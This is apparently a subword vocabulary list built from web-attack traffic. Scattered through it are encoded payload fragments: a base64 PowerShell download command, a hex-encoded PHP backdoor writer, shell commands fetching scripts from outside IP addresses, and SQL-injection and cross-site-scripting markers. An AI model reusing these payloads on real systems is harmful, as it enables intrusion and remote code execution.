UbwX
UbXH
VFS
VFUx
VFov
YQOZ
ZWkv
ZWaf
ZoBh
ZHhN
aJJy
bhwM
bhhs224x
c9h
c9YK
c9HHk
elqG
elgoog
employee
fhKe
fhUo
fhmej
gVmt
gVXq
guige
hrti
jxkFtY
kqUF
kqny
kqKF
loadPage
npmcelhine
okrZ
rhIX
rUYx
rUXL
rUXp
srpb
srwy
srGf
sGWF
tYfo
tYcd
tYIB
tasks
wbLT
wbSeq
xYvo
xYKT
xYJz
xA4
xAccept
xA8javascript
##FNYlFBdUFFNEFaUUIwQUM
##FNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR
##YoA2
##ixs
##5A04
##lcg
##lcigkdXJs
##wgwz
##wgOuz
##wgOq4sD
##3BsYX
##3BvcnQiPjw
##8gIl
##WVjaG
##WVFlI
##WVzdC
##6p3j
##jk6juns2
##jN5FJ
##a9LBv
##uh3kg
##uPSckX2
##skyljne
##0e8ow
##0eWxlPS
##g9e
##ztlY2
##pPyR
##prectp
##xLF1r8x
##oiY2x
##bYh4mA
##RvY3M
##mj8wd
##mjozyu
##mUgd29y
##cmM9Imh0d
##cmVlYmV
##NQi5IaW5hcnkg
##NvbW1
##NvbnRyb2xz
##CollectionsList
##OoXb
##OVFJ
##OVF9
##VUIiwi
##VUVVJ
##VUWTU
##VJZGVu
##VJV1V
##VJFQ1R
##0016HConnection
##orprepare
##702000000
idsave
HTTPS0016HConnection
24X55RbUw
24X55NZjQ
24X55OqyxE0Kp
exportFile
##Nobygif
qjbpq
managegroup
SearchUsers
SearchView
SearchResults
themesdir
cG93ZXJlYXR1c
typically
012User
012Connection
012Host
1958
1952
3317
3314
33137
3761
3950
3952
4422
44289
4788
4786
478280025ESERVER
5335
533840025ESERVER
5958
5793
6957
6953
6956
6750
6752
7761
7724
7725
7728
7726
7722
8767
8768
87663
9753
CEdu
CENTRAL
DIbu
GyUs
GKtM
GKcA
GKLN
GKZO
LPou
LPVI
LPnJ
LzFz
LzvA
LEWd
LENGTH
Mqjb
Mqtx
MqHy
MqOx
MZCE
MZgC
MZfu
NMqq
NeHT
NeBe
NeAY
Negotiate
NpYv
NetSet
NetObject
PC9zZ
Tjli
TjGL
WYRF
WYZjF
XvmU
XvXL
YrLF
YrLp
YGhh
YGcW
aMXm
aMuI
cpuinfo
cpGx
ccQp
cc4uu
calls
daype
daum
dashicons
gkpy
gkvvw
gEUW
gEmY
gubun
iFhr
iFSw
iFoh
iFfw
lock
loan
love
loyal
lHhz
lHWw
nXdp
nHus
nHost
nAccept
nArY
owls
oyLg
oyIf
oHwk
oHDQ
rsEx
rsquo
rslO
ssfep
ssfile1
schosite
tpEQ
vmri
vmkq
vmware
vmInvent
x8523
x20type
yMou
yMtD
zPYS
zPey
zWPE
zWmA
##FkcyA8YSBocmVm
##IHRydWU
##BzdGF
##BUN
##ik1hc
##ikQfsn
##ncPBk
##nG05G3ch
##9f4
##qnnj2g08p
##wbALpP
##wb25zZ
##3M6M
##hgfci
##hgtysk
##hg2ulhu0vp
##hdbsitnn
##aaa6c
##aaz9g9
##u4WVFlI
##k6MTp7c
##0g91wf
##0Kaz
##0KDApO
##0KaWYo
##gu3o
##guabfmu
##everyth
##1p47dj
##1bHQ
##1bwyoky
##xc9q
##KVftY
##bq4ey22
##bqBPZOw
##bnQubmV0
##bnQuY3J
##UoJGNo
##UVOVF9
##ZC5pbnRl
##Hg7Jz
##rWt7ZW
##rWCkhKp
##RP6M
##RAFiIrO
##mL8
##d4tk
##d4j8
##dzIEN
##GV2YW
##GVWpfL
##VzL2N
##VzL0
##VzBeTkL
##JTUl
chunk
4990OR9908
##0000009
demo2
##650949980
2093556
201216
201215
2012816
20124061
20127526
206044762
206048742
2019102817
201964173
HTTP0016HContent
181650
0x716a787671
digits
28937
28961
28975
281153
281105
281120
281119
281121
281103
38891
200070
exact
2999999MD5
##XJsX2
171214
##uY29wZS9
x0Djavascript
x0Dsrc
x0Donerror
clearly
##woJF9
##woJJGNo
##9090909090909090909090909
00010268
createEvent
0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6l735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878
layouts
cgt0r03uns2v9n2g08p0tkn
cgt0r03uns2v9n2g08p0q9p
cgt0r03uns2v9n2g08p0j7xt
cgt0r03uns2v9n2g08p0361p
cgt0r03uns2v9n2g08p0at91
cgt0r03uns2v9n2g08p0uo1d1j
11514461111111111
2Blocation
2dAl
2717
2719
2711
3427
3925
3929
3923
3922
3606
3601
379123
3556
4335
4336
4369
4366
4147
4148
4141
6dac076
7399
AjvQ
AHsP
ATCH
ATvQ
ATasteOfT
AGys
BXdw
Close0018
DqQL
Dqsz
DqKI
DWQQ
DWYq
DswP
FjTJ
FOHz
GszI
HXKM
HXuF
HXHi0
IrWd
IrFj
IGwc
ImageSize
ImageExt
JVmp
KFP
KFsi
KFSe
Ktrf
Ktsr
KtrN
MDpd
NIwG
Onfocus
OnError
OnMou
OwPY
OWMj
OhQ
OpMa
OctaME
PiGl
PHNjcmlwd
QZdQ
QHhq
QGlu
RcPY
SFzU
SnMD
Sdtu
SV1
SVIY
TvYS
TZqc
UIUG
UeFu
UVfm
WXjp
WXtG
WXPO
WfNl
YWRta
YxMz
ZaJG
ZfRn
axGd
axAq
axsxsx
artInfo
artbank
artStudio
bFKM
btnWrite
bsulh
cmcd
dhjj
dhwX
dhTL
dDsC
eaFV
eaoA
fsbj
favorView
grava
grIg
iBtt
iiIO
iqBe
imKo
jFsG
jJIF
khGY
kvjC
koreanbar
lBiQ
mXUe
mwvu
mJCv
nSNM
neuE
nbRD
pqht
pgId
pgSf
qnNp
qvIg
qvjvq
qvkvq
spaF
tJNk
uXIE
uuid
uQjq
wfUf
wsgi
wsUw
wVmh
xBF
x9g8
x9Ajavascript
xNXH
x09cript
yii
yEvu
yOzA
yGxx
zjuyj
zvub
zdsx
zeros6x
##FUiw
##S9zaG93bi5waHA
##S9lbi1
##S9wdWJ
##YnIGJvc
##Yxjti
##IpOztlY2
##MSQXB
##nnn
##nflfdao
##qg08p0jetob
##wtbdodoo
##wrxh9
##3guc2
##3guns6
##3gub3Bl
##3guyrnib
##hCg
##jhhec
##jhonCdu
##jdWMg
##jdXJsX2
##jJwW
##uL2FwaS9
##ky4
##kyfc
##fTUl
##0aCBPb
##0zus7
##0zyhf
##0zRF3CY
##0zfcqb8b
##yRMZEw
##yRuPSckX2
##2VyIGF0
##2Vydml
##KFYYl
##bPX3ooIQ
##bW0s
##bK8nA
##L2NvbnRlbnQ
##L2Ntcy5waHA
##RnZBg
##RVIs
##Qk2qmm
##mVyIC0gT
##DCmprO
##TJfMg
##c8snh
##NvLmtyL2F
##VwDYuw
109245
chaofi
chaonan
chaiyaphu
##0000014
##0000092
##0000016
##00000392
##000006520
4030016300
203895388
203865719
2011FDAT
20112212
208939435
searchGCcdId
1597799494
22222222
18483
70107402
projectdiscovery
28496
28498
28450
28417
28842
28832
28840
28813
200931
200917
##0001015
47956
##0F5QURRQU1QTZBRGNBTUFBM
DATAFLD
DATAFORMATAS
x3Dalert
##ContentLoaded
attachments
##vc3RCYWNr
##dGFjaG
##dGFpbnVl
0000000000000
0000000000000004
000000000119
00000000028410
000000000000006520
##UUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3QUM4QWJBQnlBQzRBY0FCekFERUFKd0FwQUE9PQ
##pbnRlcnRh
##IHxzaCBodHRwOi8vNDIuMjAwLjE1Ni4z
##0cmluZyByZW
replyAt
##b3f4lk
444400025ESERVER
attempted
##14141414141
analyzed
##0aW9uL2FwaS9
examples
nmaplowercheck1654
nmaplowercheck1655677132
nmaplowercheck1650949980
chlvbettufqmk5reelggi
cf578boqo4ccqlv00a10sbs
cf578boqo4ccqlv00a10xuh
cf578boqo4ccqlv00a10ds9
cf578boqo4ccqlv00a10wnm7
cf578boqo4ccqlv00a10gyqh
My2Lg6ccyJsqr42jL59NDGqHXzhGQHYpcwYmTy3vQ6g4rDpvfLvh
2743794
2987
3524
3525
3529
35242
39997
4614
4619
4612
474620025ESERVER
5768
5121
51239
51280
5960
7693
70001
8399
8336
8330
8406
9615
Alternate
AyRo
AyHo
ARS
ARaN
BtRL
BtGQ
BfBS
BfDr
BpSU
BpLl
BvLL
BvVi
BvXX
BvNr
Bbvf
Bbzd
CfTc
CfYw
ClientRegist
DezY
Detect
DKZj
DKsF
DVdT
DVHD
DownloadFile
EwTR
Ewig
Eyos
EyFM
FORDER
GuBI
GuOZ
GLB
GLIn
HUbr
HUnD
JNXO
JNeo
LMRQ
LMWC
LsNa
LsSb
Lrbb
LrCr
LNap
LNeX
MapSearch
OpenBSD
QWkq
QWLt
QaAz
QaxC
QJaV
QJOV
RnBh
RnvG
SoCk
SoYe
SoIy
SockAd
UqTA
UqGW
UkRo
UkXX
UkSh
UkwK
Ufoo
Ufhe
VUuH
VUOt
WoZG
Wozr
YBGk
YBqs
YEAR
YEII
ZJnN
ZJnA
ayKM
ayIm
aVMf
aVoA
bnkey
bnKP
bWXn
bWzr
bTSS
bTYn
cyqz
cyXw
cloudf
cce6c1c
egfW
eEpd
eEhA
fbpxa
fetches
gXgG
gXarSmO
gotoDeal
hfci
hfDJ
iTyd
iTiv
jAHt
jAyX
jDnh
jDfO
jEiB
jEAW
klAl
kl9aw
kdnP
kdelnk
lmHJ
lm2f3uns2
llivail
llivnaeco
nice
oceangrid
pRsa
pRpGd
qlwN
qlGX
qVzG
qVTa
rqP
rowNum
sxf
sxpG
sxvcc
sxiyo
tBLD
tBPI
wlFz
wlOB
xF0
xFpU
x2Ftype
yYiz
yYBv
yUCK
yUKM
zSNl
zSyh
zwum
zwXn
##IwLTA2
##MRSwgJG
##nx3t
##nx1u
##9shp
##9sci5za
##9zZXRvcHQ
##lvjEbA
##X1NTTF9
##X2Rvd
##X2RAFiIrO
##w1c2Vj
##3t66y
##3ZXN0IENoYW5n
##krfof
##kr5fox
##kGpTzqbd
##gw19IrT
##g8yrz
##g8emh9q
##gQGV2YW
##yhxb
##1d85uud
##x5k
##x5xxs8
##vm60nu
##buns2p3ta
##UX0N
##L3RlYW1
##ZSBDb2Rl
##ZSBzaGFy
##ZSBzdHls
##mZmVyIC0gT
##AgPSBmb
##DVVJMT
##c6rWt7ZW
##corpchie
##JB4U
##J1pOw
129672
policies
0x5D3C42523E
0x66796
0x675374
0x6d566d63
0x6d657a
9878932
##inespoilers
107485
##959ec79
##anySite
Revers3c
##701u0029u003C
203614392
203684421
207868508
209544628
209560753
2068171
20687586
20173202
USERDBDomains
admindede
appsgroup
8502a
prototype
boxs
boxOff
bookCd
28187
28189
281852
281881
##TRAIL
STARTcat
163443
257B
257D
25798
starFlag
roomDetail
252Fcookie
252Fhtml5sec
somevariable
##vc2UoJGNo
Computer
CompanySite
player2
##c2V0X21
##c2V0b3B0
1234567
##LmNvbS9zaG93bi5waHA
general
generating
##AAAAAAAAAAAAAAAA
##WFsaWdu
##WFsZXJ0K
##DovL2FsdGF
1695281700807
HTTPS0023HConnection
24X55KxIM
24X55Krjp
favicons
cjnuffcebbqkkfe9m8vg3uz
cjnuffcebbqkkfe9m8vgcar
cjnuffcebbqkkfe9m8vgpsu6
cjnuffcebbqkkfe9m8vgns6p
bittorrentnnn
##6Ly93d3cuZ2lt
cG93ZXJzaGVsbCAtZW5jIFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFNEFaUUIwQUM0QVZ3QmxBR0lBWXdCc0FHa0FaUUJ1QUhRQUtRQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQlRBSFFBY2dCcEFHNEFad0FvQUNjQWFBQjBBSFFBY0FBNkFDOEFMd0F5QURJQU13QXVBREVBTXdBd0FDNEFNUUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3QU
27732
2693
3366
4d6dcba
4791
4693
4691
6997
6993
6992
8369
8361
9504
9509
AMPo
AqcU
APR
APLA
APmv
AA4
AEYW
AcYs
AYMV
Bai
B0000204
CWwI
CyXL
CmRv
DBPC
DgNJ
Domainname
DZmr
DJgq
DJaN
DJOc
EYzO
EYyE
EYPd
EjMy
EEND
EEvN
EExtractValue
EVENT
English
FRxL
FmCD
FNab
FVTg
GSlH
GMWf
Gkku
GfwD
GxaE
GVCC
GJkk
HMcp
HqMA
Hukkan
HfhE
HcXX
HBpC
IW02
IW04
IW06
IhOD
IE7
JWyP
Jaws
JfQy
KMyn
KWBo
Kflk
Ksol
KsSN
KsGI
KvGV
KZUn
KDKq
KDfk
KDHU
LqXJ
LWjL
LgFv
LZeb
LUoM
MMXR
MPZZ
MWps
ML5
Malformed
NBSX
NBJL
NBOG
Ntqw
NfGy
NyHu
NOSp
OxlH
OUuP
OLgT
OCpf
OMOo
Okvq
OgTW
PlFo
PjRS
PK00PK
PUUH
Quff
QpBH
QTFq
QVQs
RSnake
RIYX
RqQS
RyTG
RHhS
RrgG
RDcl
SgcT
SQlite
SQSh
SQnG
TMMP
TlWt
THCt
TTDC
TJKF
TESTHTML5FOR
UWqh
Ujti
UjsP
UjWX
UsvQ
UrxW
Ucmu
ViewImg
Vxfe
VQWx
Voga
WnJD
WwUU
WLis
WLhw
WLBL
WQXU
WDqq
WCem
Xqie
XPaN
XwIC
XhDA
XEQ
XcVH
XNND
XmlAp
YMnx
YiQW
YtXZ
YyK54
YLqg
YCNz
YMwZ
ZMPF
ZwCt
ZQEs
ZcIw
ZOPT
ZEDS
aWtf
akPo
aZar
amIT
amHb
amkbins
alpha2
bfCode
bfKp
bfRh
b2b
b2MV
bv533
bZiL
bczV
bVId
bpoO
cYQJ
cUNy
cZxU
cJYR
certain
ceracomb
cjcqv
dXKy
dXpQ
dHjQ
dGcA
dJAV
dallocation
ewIh
ewBo
ewebeditor
ekzj
eoBl
eLuc
ecmascript
eclang
ecatalogt
fYtC
fnVi
fPdv
fees
fRDb
fdwL
fNap
giYD
gLPC
glossari
hUSt
hitkuplrgs
iwPs
ijFX
iaction
iLws
iAhE
iEGL
jnr3juns2lojq
jwte
jwKn
jwZK
jzwd
jQvC
jTZZ
kkwt
ksm
ksFx
ksponco
kQxF
kNqo
kgDr
lYIk
lkWZ
lUVi
lUJD
lUNQ
lQvN
lTwU
lNHa
lNky
lNIt
mFjL
mnXq
mWsl
mxjgg
mmYC
nnBh
njKf
numbers
nzdo
nUHn
nDzJ
ncYX
nodes
nodeid
nodong
oqUR
olAr
oQoy
odnC
pXcr
psqy
qzkbq
qzzqq
qzvpq
qoOk
qQf
qVKR
riWf
riJZ
ri4pa
rZkX
rRld
rVcn
swEY
sWzq
s2UBAAABAAAAAAAABmdvb2dsZQNjb20AAAEAAQ
smtp
sNKQ
sCyY
sigung
tFjK
tqsd
tqKt
tWtu
tjhukkan
tzwi
term
terry
terminal
uqZL
uwWB
uhxt
uLja
uRGS
vBzZ
vM3
vMim
vMNm
vhul
voGl
vUdX
vLhe
vZrC
vcwQ
vCti
wtHv
weather
wAXX
wgpQ
xhqq
xuil
xRCH
x81expression
x02javascript
yeDC
yZXz
yrqd
yrJr
yrFn
yLjo
zhGv
zZxY
zDwR
##7hizxy
##4gAAAAAAAAAAAAAAAA
##4xMzg
##4xMjAuNjQ
##Y3VyaXR
##IUfma5
##BfBl3x
##MQNwM
##i1hz45yv
##iO3M6M
##nN1c3R
##networks
##tlwp
##t8c8snh
##txsot
##5j3yt
##5jmj8wd
##5MDt9f
##9CSUx
##9CR1d
##qtmhq5
##qeh4l
##luZz0w
##wj7us
##wuj
##wUmVxd
##8by9uxqp
##WRVJJ
##6x2X
##6xjqhugk
##j942
##j8sxu4
##aPy
##k9a5jw
##k0o1
##fu9kp
##f0hdbsitnn
##fznro
##0fd0
##058uzdhz3
##gfdg
##gf3p
##gbv5nm3
##gZXhlY
##gJFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR
##eT2shp
##yMDExLTA2LT
##1C5A04
##27555x08
##pvue1g
##pKSB7Cg
##KKRP6M
##b2d55da
##UkVUVVJ
##UvSW1hZ2
##L2FwaS9
##L2FwcG
##ZJFGrvi
##HM6L
##HM6Ly93d3cuZ2lt
##Hy0Hg
##r3mhp
##RvKTsiKT
##RZNDTRA
##mn8qg08p0
##mNlL3Rl
##ET0NVT
##d0gygqb17
##d0OoXb
##O041A
##Om1pZGRsZT
##Gbntc6
##VuY3Rpb24
##J0blNl
##J3Zlcn
11580
injected
intended
initEvent
##ruidcomment
45973760
1231412
12587
checklist
##orKxyt
40795
4068150
depth2
depth1
PD9jdWMg
##446739
507245
209905393
209095783
206938018
208412024
2021년도
52933
searchSmlCd
searchBmC
51020
##display
152136934
regular
repeated
repeating
repeatCount
22388888
##ptnubs3
42462
##5086876
##seeing
281239
281278
281241
28285
28925
281542
2FELT
200210
200207
##keXdWD
21685
##ocmVhCg
webmailAttache
actionregistcorpchie
1732143677
1700015ESERVER
lequcmf
lequzur
lequxwb
##29yOnRydW
uniOn
2552603
##ubscriptions
39287
##jaG8o
##MyJournal
23evyWxC9Dd
##aysf
##WN1cml0e
successfull
##ag08p085b
##vcmF3L0
##biBjdXJsX2
1697cb20
1696498936
16964889680
16964097051
Y3VycmVu
Y3VycmVuaWNh
Y3Vyc29yOnRydW
moderation
##c2h5cnR
##c2NyaXB0Om9
##FieldItem
##PSJodHRwOi8vMTIvM
##udmVyc2lvbiB
##IHN0cmluZyB
##IHN0eWxlPS
##IHN0cmluZyByZW
directToK
##tufqq46hu
ciqvpe
x0Bcript
x0Bscript
x0Bjavascript
0x7170706271
pubYear1
topicparent
Autofocus
##MgLS0g
cG93ZXJlZCBpbnRlZ2Vy
cG93ZXJlZCBtZQ
cG93ZXJlZCBpbnRlcnRh
7688776e292
7688776e2928696f
7688776e2896b6f286f2
##lvbiB2YWx1
##lvbiBDb21wdXRlZCB
##nRlbnQtY29udmVyc2V0
2013FDAT0000004
2013FDAT0000009
2013FDAT0000016
0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6m6c735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476
##ELSE0END
brdCodeValue
PC90ZD48L
##1pZGRsZSBzdHls
destinations
##8xOTIuZ29
##0aGUgZG9ja
##pbnRlZ2Vycy9
##pbnRlZ2VycyBh
##Iuc2ggfHNodHRwOi8vNTkuNy4yMTcuMjQzOjcwNzAvZG9jcy9scnIuc2ggfHNodHRwOi8vNTkuNy4yMTcuMjQzOjcwNzAvZG9jcy9scnIuc2ggfHN
267d23df
##IEphcnRlZCBieSBvZiBBbmRyb2lkIHNvZnRlbiBmcm9tIEphcnRlZCBieSBwaWV3IFN0cmluZyBDb2RlIEphcnRlZCB0byB0aGUgdGhlIENvcnBvcmF0aW9uIENsYXN0aWMgLSB2YWx1
chlvbettufqmk5reelggjhf
chlvbettufqmk5reelgg16we
chlvbettufqmk5reelggt8c8snh
fetching
##aHR0cDovL3hz
##RtaW5pc3R
##A6D1C5A04
##vc2NyaXB0Pg
##Lm9yZy94c3Nt
[...]
